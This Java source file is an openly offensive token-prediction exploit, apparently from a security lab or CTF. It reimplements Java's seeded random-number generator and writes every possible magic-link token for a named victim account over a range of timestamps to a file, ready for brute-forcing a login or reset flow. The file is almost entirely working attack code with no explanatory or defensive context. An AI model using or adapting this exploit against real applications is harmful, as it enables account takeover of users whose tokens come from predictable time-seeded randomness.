import java.util.Base64;
import java.util.Random;
import java.lang.String;
import java.io.FileWriter;
import java.io.IOException;

/*
Compile before usage: javac TokenUtil.java
Usage: java TokenUtil <start_timestamp> <stop_timestamp> <victim_account_id>
*/

public class TokenUtil {
    public static void main(String args[]) {
        if(args.length < 3){
            System.out.println("\n[!] Usage: java TokenUtil <start_timestamp> <stop_timestamp> <victim_account_id>");
            System.exit(0);
        }
        long start = Long.parseLong(args[0]);
        long stop = Long.parseLong(args[1]);
        int userId = Integer.parseInt(args[2]);
        String token = "";

        int tokenCount = 0;
        
        try (FileWriter writer = new FileWriter("MgkTkns.txt")) {
            for (long l = start; l < stop; l++) {
                token = createToken(userId, l);
                writer.write(token);
                writer.write(System.lineSeparator());
                tokenCount++;
            }
            System.out.println("[+] Generated " + tokenCount + " tokens and saved to MgkTkns.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static String createToken(int userId, long seed) {
        String CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz";
        String NUMBERS = "1234567890";
        String SYMBOLS = "!@#$%^&*()";
        String CHARSET = CHAR_LOWER + CHAR_LOWER.toUpperCase() + NUMBERS + SYMBOLS;
        int TOKEN_LENGTH = 42;
        JavaRandom random = new JavaRandom(seed);
        StringBuilder sb = new StringBuilder();
        byte[] encbytes = new byte[TOKEN_LENGTH];
        
        for(int i = 0; i < 42; i++) {
            sb.append(CHARSET.charAt(random.nextInt(CHARSET.length())));
        }
        
        byte[] bytes = sb.toString().getBytes();
        
        for(int i=0; i<bytes.length; i++) {
            encbytes[i] = (byte) (bytes[i] ^ (byte) userId);
        }
        
        return Base64.getUrlEncoder().withoutPadding().encodeToString(encbytes);
    }

    static class JavaRandom {
        private long seed;

        public JavaRandom(long seed) {
            this.seed = (seed ^ 0x5DEECE66DL) & ((1L << 48) - 1);
        }

        public int next(int bits) {
            seed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
            return (int) (seed >>> (48 - bits));
        }

        public int nextInt(int bound) {
            if ((bound & -bound) == bound) {
                return (int) ((bound * (long) next(31)) >> 31);
            }
            
            int bits = next(31);
            int val = bits % bound;
            while (bits - val + (bound - 1) < 0) {
                bits = next(31);
                val = bits % bound;
            }
            return val;
        }
    }
}
